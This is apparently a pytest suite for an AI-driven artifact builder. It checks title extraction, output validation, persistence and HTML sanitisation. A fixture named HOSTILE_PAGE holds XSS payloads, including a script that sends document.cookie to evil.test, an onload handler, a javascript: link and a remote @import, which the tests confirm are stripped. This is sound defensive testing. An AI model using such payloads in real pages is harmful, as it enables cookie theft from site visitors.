"""Artifact generation, validation, persistence and the security path."""

from __future__ import annotations

import pytest

from app.artifacts.builder import MAX_ARTIFACT_CHARS, build_artifact, derive_title, strip_code_fence
from app.core.errors import ArtifactGenerationError
from app.models.artifact import ArtifactType
from tests.conftest import ACTIVATION_CHUNKS, seed_transcript

SAFE_PAGE = """<!DOCTYPE html>
<html lang="en"><head><title>Activation Landing Page</title>
<style>body { font-family: system-ui; } .hero { display: grid; }</style></head>
<body><header><h1>Reach value faster</h1></header><main><section class="hero">
<p>Grounded copy [S1].</p></section></main></body></html>"""

HOSTILE_PAGE = """<!DOCTYPE html>
<html><head><title>Pwn</title><style>@import url('https://evil.test/x.css');</style></head>
<body onload="steal()"><h1>Hello</h1>
<script>fetch('https://evil.test?c='+document.cookie)</script>
<a href="javascript:alert(1)">click</a><iframe src="https://evil.test"></iframe></body></html>"""


async def _new_session(client) -> str:  # noqa: ANN001
    response = await client.post("/api/sessions", json={})
    return response.json()["id"]


# ------------------------------------------------------------------------ builder
def test_code_fences_are_stripped():
    assert strip_code_fence("```html\n<h1>Hi</h1>\n```") == "<h1>Hi</h1>"
    assert strip_code_fence("```\n# Doc\n```") == "# Doc"
    assert strip_code_fence("# Already clean") == "# Already clean"


def test_markdown_title_comes_from_the_h1():
    built = build_artifact("# Activation Playbook\n\nBody text.", ArtifactType.MARKDOWN, fallback_title="fallback")

    assert built.title == "Activation Playbook"
    assert built.sanitised is False
    assert built.content.startswith("# Activation Playbook")


def test_html_title_prefers_the_title_element_then_h1():
    assert derive_title("<html><head><title>From Title</title></head></html>", ArtifactType.HTML, "fb") == "From Title"
    assert derive_title("<html><body><h1>From H1</h1></body></html>", ArtifactType.HTML, "fb") == "From H1"
    assert derive_title("<html><body><p>none</p></body></html>", ArtifactType.HTML, "fb") == "fb"


def test_prose_around_an_html_document_is_discarded():
    raw = "Sure! Here is the page you asked for:\n\n" + SAFE_PAGE + "\n\nLet me know what you think!"

    built = build_artifact(raw, ArtifactType.HTML, fallback_title="fb")

    assert built.content.startswith("<!DOCTYPE html>")
    assert "Let me know what you think" not in built.content
    assert built.title == "Activation Landing Page"


def test_empty_output_is_rejected():
    with pytest.raises(ArtifactGenerationError) as exc_info:
        build_artifact("   ", ArtifactType.MARKDOWN, fallback_title="fb")

    assert exc_info.value.code == "artifact_generation_failed"


def test_non_html_output_for_an_html_request_is_rejected():
    with pytest.raises(ArtifactGenerationError) as exc_info:
        build_artifact("I cannot build that page.", ArtifactType.HTML, fallback_title="fb")

    assert "did not return an HTML document" in exc_info.value.message


def test_oversized_artifact_is_rejected():
    with pytest.raises(ArtifactGenerationError) as exc_info:
        build_artifact("x" * (MAX_ARTIFACT_CHARS + 1), ArtifactType.MARKDOWN, fallback_title="fb")

    assert "character limit" in exc_info.value.message


def test_html_artifacts_are_sanitised_and_the_removals_reported():
    built = build_artifact(HOSTILE_PAGE, ArtifactType.HTML, fallback_title="fb")

    assert built.sanitised is True
    assert "<script" not in built.content.lower()
    assert "onload" not in built.content.lower()
    assert "javascript:" not in built.content.lower()
    assert "<iframe" not in built.content.lower()
    assert "@import" not in built.content
    assert "evil.test" not in built.content
    assert built.report is not None and built.report.modified is True
    assert built.report.removed_tags.get("script") == 1


def test_markdown_is_not_html_sanitised():
    """Markdown is rendered through DOMPurify in the browser, so the raw text is kept."""
    built = build_artifact("# Doc\n\nUse `<script>` in a code span.", ArtifactType.MARKDOWN, fallback_title="fb")

    assert built.sanitised is False
    assert "<script>" in built.content


# --------------------------------------------------------------------- end to end
async def test_markdown_artifact_is_generated_and_persisted(client, db, provider):  # noqa: ANN001
    await seed_transcript(db, title="Activation deep dive", chunks=ACTIVATION_CHUNKS)
    provider.queue("# Activation Strategy\n\n## Why it matters\n\nMeasure first value [S1].")
    session_id = await _new_session(client)

    response = await client.post(
        "/api/chat",
        json={"session_id": session_id, "message": "Create a Markdown strategy document for activation"},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["intent"] == "artifact"

    artifact = body["message"]["artifact"]
    assert artifact is not None
    assert artifact["type"] == "markdown"
    assert artifact["title"] == "Activation Strategy"
    assert artifact["sanitised"] is False
    assert "Measure first value" in artifact["content"]
    # The chat text should point at the viewer rather than dumping the document.
    assert "Activation Strategy" in body["message"]["content"]
    assert "## Why it matters" not in body["message"]["content"]


async def test_html_artifact_is_generated_sanitised_and_persisted(client, db, provider):  # noqa: ANN001
    await seed_transcript(db, title="Activation deep dive", chunks=ACTIVATION_CHUNKS)
    provider.queue(HOSTILE_PAGE)
    session_id = await _new_session(client)

    response = await client.post(
        "/api/chat", json={"session_id": session_id, "message": "Create a landing page for this idea"}
    )

    artifact = response.json()["message"]["artifact"]
    assert artifact["type"] == "html"
    assert artifact["sanitised"] is True
    # Only the sanitised document is ever stored, so nothing unsafe can be re-served.
    assert "<script" not in artifact["content"].lower()
    assert "onload" not in artifact["content"].lower()
    assert artifact["sanitiser_report"]["modified"] is True
    assert artifact["sanitiser_report"]["removed_tags"]["script"] == 1
    assert "Content-Security-Policy" in artifact["content"]


async def test_artifact_endpoint_generates_an_explicit_type(client, db, provider):  # noqa: ANN001
    await seed_transcript(db, title="Activation deep dive", chunks=ACTIVATION_CHUNKS)
    provider.queue(SAFE_PAGE)
    session_id = await _new_session(client)

    response = await client.post(
        "/api/artifacts",
        json={"session_id": session_id, "artifact_type": "html", "instruction": "Landing page for our activation tool"},
    )

    assert response.status_code == 200
    artifact = response.json()["message"]["artifact"]
    assert artifact["type"] == "html"
    assert artifact["title"] == "Activation Landing Page"


async def test_latest_artifact_can_be_restored_for_a_session(client, db, provider):  # noqa: ANN001
    await seed_transcript(db, title="Activation deep dive", chunks=ACTIVATION_CHUNKS)
    provider.queue("# First Doc\n\nBody [S1].")
    session_id = await _new_session(client)
    await client.post("/api/chat", json={"session_id": session_id, "message": "Create a markdown one-pager"})

    response = await client.get(f"/api/artifacts/session/{session_id}/latest")

    assert response.status_code == 200
    assert response.json()["title"] == "First Doc"


async def test_session_without_artifacts_returns_404(client):  # noqa: ANN001
    session_id = await _new_session(client)

    response = await client.get(f"/api/artifacts/session/{session_id}/latest")

    assert response.status_code == 404
    assert response.json()["error"]["code"] == "not_found"


async def test_artifact_works_without_transcript_evidence(client, provider):  # noqa: ANN001
    """"Turn our discussion into a page" is a formatting request, not a knowledge query."""
    provider.queue(SAFE_PAGE)
    session_id = await _new_session(client)

    response = await client.post(
        "/api/chat", json={"session_id": session_id, "message": "Create a landing page for my new idea"}
    )

    body = response.json()
    assert body["message"]["artifact"] is not None
    assert body["message"]["sources"] == []
    assert "no transcript sources" in body["message"]["content"].lower()


async def test_invalid_artifact_type_is_rejected(client):  # noqa: ANN001
    session_id = await _new_session(client)

    response = await client.post(
        "/api/artifacts",
        json={"session_id": session_id, "artifact_type": "pdf", "instruction": "make a pdf"},
    )

    assert response.status_code == 422
    assert response.json()["error"]["code"] == "validation_failed"


async def test_failed_artifact_generation_returns_a_typed_error(client, provider):  # noqa: ANN001
    provider.queue("I am not going to produce HTML.")
    session_id = await _new_session(client)

    response = await client.post(
        "/api/artifacts",
        json={"session_id": session_id, "artifact_type": "html", "instruction": "Landing page"},
    )

    assert response.status_code == 502
    assert response.json()["error"]["code"] == "artifact_generation_failed"
